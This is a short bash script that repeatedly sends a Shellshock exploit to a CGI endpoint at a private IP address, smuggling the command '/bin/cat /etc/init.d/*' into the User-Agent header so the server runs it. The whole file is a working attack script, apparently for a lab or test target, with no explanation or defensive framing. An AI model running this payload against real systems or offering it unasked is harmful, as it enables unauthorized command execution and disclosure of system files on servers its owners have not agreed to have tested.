#!/bin/bash

for i in $(eval echo {$1..$2})
do
curl -k -A "() { :;}; \/bin\/cat \/etc\/init.d\/*" https://10.176.147.83/cgi-bin/ss2

sleep 4

done

